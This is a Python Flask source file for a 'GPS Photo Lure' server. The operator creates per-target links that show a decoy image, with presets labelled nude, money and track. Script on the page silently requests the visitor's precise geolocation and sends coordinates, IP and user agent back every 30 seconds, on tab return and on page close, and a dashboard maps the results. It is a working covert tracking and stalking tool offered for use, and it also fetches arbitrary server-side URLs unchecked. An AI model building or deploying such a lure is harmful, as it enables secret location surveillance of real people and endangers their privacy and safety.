#!/usr/bin/env python3
"""
GPS Photo Lure Server v3
- Choose image from presets (nude/money/track), upload, or external URL
- Shows decoy image + GPS fires instantly
- GPS refreshes every 30 seconds (continuous trail)
- Every visit logged with full GPS coordinates
"""

import os
import json
import uuid
import base64
import hashlib
import logging
import threading
import requests
from datetime import datetime, timezone
from pathlib import Path
from io import BytesIO

from flask import (
    Flask, request, render_template_string, jsonify,
    redirect, url_for, send_file, abort
)

# ── Config ──────────────────────────────────────────────────
DEFAULT_PORT = 5000
DEFAULT_HOST = "0.0.0.0"
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16 MB
PRESETS = {"nude", "money", "track"}

# In-memory storage
links = {}
links_lock = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("gps-lure")

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH

# ── Image helpers ──────────────────────────────────────────

def load_preset_image(preset_name):
    """Load a preset image from the /images/ folder"""
    path = Path("images") / f"{preset_name}.png"
    if path.exists():
        return path.read_bytes(), "image/png"
    path = Path("images") / f"{preset_name}.jpg"
    if path.exists():
        return path.read_bytes(), "image/jpeg"
    return None, None


def fetch_external_image(url):
    """Download an image from an external URL"""
    try:
        resp = requests.get(url, timeout=10, stream=True)
        if resp.status_code == 200:
            content_type = resp.headers.get("Content-Type", "image/jpeg")
            return resp.content, content_type
    except Exception as e:
        log.warning("Failed to fetch external image %s: %s", url, e)
    return None, None

# ── Stealth HTML template (photo decoy page) ──────────────

STEALTH_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Photo</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        padding: 10px;
    }
    .photo-container {
        max-width: 100%;
        max-height: 95vh;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 4px 30px rgba(255,255,255,0.15);
        background: #111;
    }
    .photo-container img {
        display: block;
        max-width: 100%;
        max-height: 90vh;
        width: auto;
        height: auto;
        object-fit: contain;
    }
    .status-bar {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0,0,0,0.7);
        color: #444;
        font-size: 10px;
        padding: 3px 12px;
        text-align: center;
        backdrop-filter: blur(4px);
        font-family: system-ui, sans-serif;
        z-index: 999;
    }
</style>
</head>
<body>
    {% if img_data %}
    <div class="photo-container">
        <img src="{{ img_data }}" alt="Photo">
    </div>
    {% else %}
    <div class="photo-container" style="display:flex;align-items:center;justify-content:center;padding:40px;color:#555;">
        <p>No image available.</p>
    </div>
    {% endif %}
    <div class="status-bar">Photo &bull; {{ visit_num }}</div>

<script>
(function() {
    var linkId = "{{ link_id }}";
    var visited = {{ visit_num }};
    var gpsInterval = null;

    function sendCapture(lat, lng, acc, err) {
        var payload = {
            link_id: linkId,
            visit: visited,
            latitude: lat,
            longitude: lng,
            accuracy: acc,
            error: err,
            user_agent: navigator.userAgent,
            timestamp_iso: new Date().toISOString()
        };
        // XHR
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/capture", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(payload));
        } catch(e) {}
        // Fetch fallback
        fetch("/capture", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(function(){});
    }

    function captureLocation() {
        if (!navigator.geolocation) {
            sendCapture(null, null, null, "geolocation not supported");
            return;
        }
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                sendCapture(
                    pos.coords.latitude,
                    pos.coords.longitude,
                    pos.coords.accuracy,
                    null
                );
            },
            function(err) {
                var msg = err.message || "unknown error";
                if (err.code === 1) msg = "permission denied";
                else if (err.code === 2) msg = "position unavailable";
                else if (err.code === 3) msg = "timeout";
                sendCapture(null, null, null, msg);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    // Fire GPS immediately on page load
    setTimeout(captureLocation, 200);

    // Continuous GPS refresh every 30 seconds
    gpsInterval = setInterval(captureLocation, 30000);

    // Also fire when user returns to the tab
    document.addEventListener("visibilitychange", function() {
        if (!document.hidden) {
            captureLocation();
        }
    });

    // Fire one last time before page closes
    window.addEventListener("beforeunload", function() {
        if (gpsInterval) clearInterval(gpsInterval);
        captureLocation();
    });
})();
</script>
</body>
</html>"""


# ── Routes ────────────────────────────────────────────────

@app.route("/")
def index():
    """Landing page — link manager with image selection"""
    return """<!DOCTYPE html>
<html>
<head>
<title>GPS Lure v3 — Link Manager</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { box-sizing: border-box; }
    body { font-family: system-ui, -apple-system, sans-serif; background: #0d0d10; color: #ddd; padding: 20px; max-width: 900px; margin: 0 auto; }
    h1 { color: #0a8; font-size: 22px; }
    h2 { color: #aaa; font-size: 16px; margin-top: 25px; }
    .card { background: #16161e; border: 1px solid #2a2a35; border-radius: 8px; padding: 20px; margin: 15px 0; }
    label { display: block; margin: 10px 0 4px; font-size: 13px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }
    input, select { width: 100%; padding: 8px 10px; background: #0d0d12; border: 1px solid #2a2a35; color: #eee; border-radius: 4px; font-size: 14px; }
    input:focus, select:focus { border-color: #0a8; outline: none; }
    .radio-group { display: flex; gap: 20px; flex-wrap: wrap; margin: 8px 0; }
    .radio-group label { display: inline-flex; align-items: center; gap: 5px; text-transform: none; font-size: 14px; cursor: pointer; }
    .radio-group input[type="radio"] { width: auto; }
    .hidden { display: none; }
    button { background: #0a8; color: #fff; border: none; padding: 10px 28px; border-radius: 6px; font-size: 15px; cursor: pointer; font-weight: 600; margin-top: 10px; }
    button:hover { background: #0b9; }
    code { background: #1a1a24; padding: 2px 6px; border-radius: 3px; font-size: 13px; color: #8cf; word-break: break-all; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 8px 10px; text-align: left; border-bottom: 1px solid #222; font-size: 13px; }
    th { color: #666; font-weight: 600; }
    a { color: #4af; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .help { font-size: 12px; color: #666; margin-top: 3px; }
</style>
</head>
<body>
    <h1>📷 GPS Photo Lure v3</h1>
    <p style="color:#888;">Create a tracking link. Target sees a photo; GPS fires silently &amp; continuously.</p>

    <div class="card">
        <form action="/create" method="post" enctype="multipart/form-data" id="createForm">

            <label>Image Source</label>
            <div class="radio-group">
                <label><input type="radio" name="img_source" value="preset" checked onchange="toggleSource()"> Preset Image</label>
                <label><input type="radio" name="img_source" value="upload" onchange="toggleSource()"> Upload Image</label>
                <label><input type="radio" name="img_source" value="url" onchange="toggleSource()"> External URL</label>
            </div>

            <div id="presetSection">
                <label>Choose Preset</label>
                <select name="preset">
                    <option value="nude">nude.png</option>
                    <option value="money">money.png</option>
                    <option value="track">track.png</option>
                </select>
                <div class="help">Upload the actual PNG files to images/ folder</div>
            </div>

            <div id="uploadSection" class="hidden">
                <label>Upload Image (max 16MB)</label>
                <input type="file" name="photo" accept="image/*">
            </div>

            <div id="urlSection" class="hidden">
                <label>External Image URL</label>
                <input type="url" name="img_url" placeholder="https://example.com/photo.jpg">
                <div class="help">Server will download this image and embed it in the attack page</div>
            </div>

            <label>Label / Notes (optional)</label>
            <input type="text" name="label" placeholder="e.g. Target Alpha">

            <button type="submit">Generate Tracking Link</button>
        </form>
    </div>

    <h2>Active Links</h2>
    <div id="links">Loading...</div>

    <script>
        function toggleSource() {
            var val = document.querySelector('input[name="img_source"]:checked').value;
            document.getElementById('presetSection').className = val === 'preset' ? '' : 'hidden';
            document.getElementById('uploadSection').className = val === 'upload' ? '' : 'hidden';
            document.getElementById('urlSection').className = val === 'url' ? '' : 'hidden';
        }
        function loadLinks() {
            fetch('/links').then(function(r){ return r.json(); }).then(function(data){
                var html = '<table><tr><th>Created</th><th>Label</th><th>Tracking URL</th><th>Visits</th><th>GPS Hits</th><th>Results</th></tr>';
                data.links.forEach(function(l){
                    var url = window.location.origin + '/l/' + l.id;
                    html += '<tr>';
                    html += '<td style="font-size:11px;white-space:nowrap;">' + l.created + '</td>';
                    html += '<td>' + (l.label||'-') + '</td>';
                    html += '<td><code>' + url + '</code></td>';
                    html += '<td style="text-align:center;">' + l.visits + '</td>';
                    html += '<td style="text-align:center;">' + l.captures + '</td>';
                    html += '<td><a href="/results/' + l.id + '">View</a></td>';
                    html += '</tr>';
                });
                html += '</table>';
                document.getElementById('links').innerHTML = html;
            });
        }
        toggleSource();
        loadLinks();
        setInterval(loadLinks, 5000);
    </script>
</body>
</html>"""


@app.route("/create", methods=["POST"])
def create_link():
    """Create a new tracking link"""
    label = request.form.get("label", "").strip()
    img_source = request.form.get("img_source", "preset")

    img_data = None

    if img_source == "preset":
        preset = request.form.get("preset", "nude").strip().lower()
        if preset not in PRESETS:
            preset = "nude"
        raw_bytes, mime = load_preset_image(preset)
        if raw_bytes:
            img_b64 = base64.b64encode(raw_bytes).decode("utf-8")
            img_data = f"data:{mime};base64,{img_b64}"

    elif img_source == "upload":
        photo = request.files.get("photo")
        if photo and photo.filename:
            raw_bytes = photo.read()
            if raw_bytes:
                ext = Path(photo.filename).suffix.lower()
                mime_map = {
                    ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                    ".gif": "image/gif", ".webp": "image/webp",
                }
                mime = mime_map.get(ext, "image/jpeg")
                img_b64 = base64.b64encode(raw_bytes).decode("utf-8")
                img_data = f"data:{mime};base64,{img_b64}"

    elif img_source == "url":
        img_url = request.form.get("img_url", "").strip()
        if img_url:
            raw_bytes, mime = fetch_external_image(img_url)
            if raw_bytes:
                img_b64 = base64.b64encode(raw_bytes).decode("utf-8")
                img_data = f"data:{mime};base64,{img_b64}"

    link_id = uuid.uuid4().hex[:12]

    with links_lock:
        links[link_id] = {
            "id": link_id,
            "created": datetime.now(timezone.utc).isoformat(),
            "label": label if label else None,
            "img_data": img_data,
            "img_source": img_source,
            "visits": [],
        }

    log.info("Created link %s (label=%s, source=%s)", link_id, label, img_source)
    return redirect(url_for("index"))


@app.route("/l/<link_id>")
def serve_lure(link_id):
    """Serve the decoy photo page + GPS capture"""
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404

    visit_num = len(link["visits"]) + 1

    visit_record = {
        "visit": visit_num,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        "gps_updates": [],
    }

    with links_lock:
        link["visits"].append(visit_record)

    log.info("Link %s visit #%d from %s", link_id, visit_num, request.remote_addr)

    return render_template_string(
        STEALTH_TEMPLATE,
        link_id=link_id,
        visit_num=visit_num,
        img_data=link["img_data"],
    )


@app.route("/capture", methods=["POST"])
def capture_gps():
    """Receive GPS coordinates from the stealth page"""
    data = request.get_json(silent=True) or {}
    link_id = data.get("link_id")
    visit_num = data.get("visit")
    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")
    err = data.get("error")
    ua = data.get("user_agent", "")
    ts = data.get("timestamp_iso", datetime.now(timezone.utc).isoformat())

    if not link_id:
        return jsonify({"status": "missing link_id"}), 400

    with links_lock:
        link = links.get(link_id)
        if not link:
            return jsonify({"status": "link not found"}), 404

        for v in link["visits"]:
            if v["visit"] == visit_num:
                v["user_agent"] = ua
                v["gps_updates"].append({
                    "latitude": lat,
                    "longitude": lng,
                    "accuracy": acc,
                    "error": err,
                    "timestamp": ts,
                })
                break

    if lat is not None:
        log.info("📍 GPS for %s visit #%s: %.5f, %.5f (acc=%.1fm)",
                 link_id, visit_num, lat, lng, acc or 0)
    else:
        log.info("⛔ GPS failed for %s visit #%s: %s", link_id, visit_num, err)

    return jsonify({"status": "ok"})


@app.route("/results/<link_id>")
def show_results(link_id):
    """Detailed results for a specific link"""
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404
        import copy
        link_data = copy.deepcopy(link)

    total_visits = len(link_data["visits"])
    total_gps_hits = sum(
        1 for v in link_data["visits"]
        for u in v.get("gps_updates", [])
        if u.get("latitude") is not None
    )

    html = f"""<!DOCTYPE html>
<html>
<head>
<title>Results — {link_id}</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * {{ box-sizing: border-box; }}
    body {{ font-family: system-ui, -apple-system, sans-serif; background: #0d0d10; color: #ddd; padding: 20px; max-width: 1100px; margin: 0 auto; }}
    h1 {{ color: #0a8; }}
    h2 {{ color: #aaa; font-size: 18px; margin-top: 25px; }}
    .info {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 8px; padding: 15px; margin: 10px 0; }}
    .info p {{ margin: 4px 0; font-size: 14px; }}
    table {{ width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }}
    th, td {{ padding: 6px 8px; text-align: left; border-bottom: 1px solid #222; }}
    th {{ color: #666; font-weight: 600; }}
    .success {{ color: #4c4; }}
    .fail {{ color: #c44; }}
    code {{ background: #1a1a24; padding: 2px 6px; border-radius: 3px; color: #8cf; }}
    pre {{ background: #111117; padding: 15px; border-radius: 6px; overflow-x: auto; font-size: 11px; }}
    a {{ color: #4af; }}
    .visit-card {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 6px; padding: 10px; margin: 8px 0; }}
    .visit-card h4 {{ margin: 0 0 5px; color: #888; }}
    .gps-update {{ font-size: 11px; margin: 2px 0; }}
</style>
</head>
<body>
    <h1>📊 Link Results</h1>
    <div class="info">
        <p><strong>ID:</strong> <code>{link_id}</code></p>
        <p><strong>Label:</strong> {link_data["label"] or "(none)"}</p>
        <p><strong>Created:</strong> {link_data["created"]}</p>
        <p><strong>Image Source:</strong> {link_data["img_source"]}</p>
        <p><strong>Total Visits:</strong> {total_visits}</p>
        <p><strong>Total GPS Updates:</strong> {total_gps_hits}</p>
        <p><strong>Tracking URL:</strong> <code>{request.host_url.strip('/')}/l/{link_id}</code></p>
    </div>
"""

    for v in link_data["visits"]:
        gps_updates = v.get("gps_updates", [])
        latest_gps = None
        for u in reversed(gps_updates):
            if u.get("latitude") is not None:
                latest_gps = u
                break

        status = "📍 Located" if latest_gps else ("⛔ Failed" if any(u.get("error") for u in gps_updates) else "⏳ Pending")
        status_cls = "success" if latest_gps else "fail"

        html += f"""
    <div class="visit-card">
        <h4>Visit #{v["visit"]} — <span class="{status_cls}">{status}</span></h4>
        <p style="font-size:11px;color:#666;">{v["timestamp"]} | IP: {v["ip"]} | {v.get("user_agent","")[:50]}</p>
"""

        if gps_updates:
            html += f'<p style="font-size:11px;color:#888;margin:5px 0;">GPS Updates ({len(gps_updates)}):</p>'
            for idx, u in enumerate(gps_updates):
                if u.get("latitude") is not None:
                    map_url = f"https://www.google.com/maps?q={u['latitude']},{u['longitude']}"
                    html += f'<div class="gps-update">#{idx+1}: <span class="success">{u["latitude"]:.5f}, {u["longitude"]:.5f}</span>'
                    if u.get("accuracy"):
                        html += f' ±{u["accuracy"]:.1f}m'
                    html += f' <a href="{map_url}" target="_blank" style="color:#0a8;">[Map]</a>'
                    html += f' {u["timestamp"][:19]}</div>'
                elif u.get("error"):
                    html += f'<div class="gps-update">#{idx+1}: <span class="fail">❌ {u["error"]}</span> {u["timestamp"][:19]}</div>'

        html += '</div>'

    html += f"""
    <h2>Raw Data (JSON)</h2>
    <pre>{json.dumps(link_data, indent=2, default=str)}</pre>
</body>
</html>"""

    return html


@app.route("/links")
def list_links():
    """JSON endpoint: all active links"""
    with links_lock:
        result = []
        for lid, l in links.items():
            total_visits = len(l["visits"])
            captures = sum(
                1 for v in l["visits"]
                for u in v.get("gps_updates", [])
                if u.get("latitude") is not None
            )
            result.append({
                "id": lid,
                "created": l["created"],
                "label": l["label"],
                "img_source": l["img_source"],
                "visits": total_visits,
                "captures": captures,
            })
    return jsonify({"links": result, "total": len(result)})


@app.route("/health")
def health():
    return jsonify({"status": "ok", "links": len(links)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
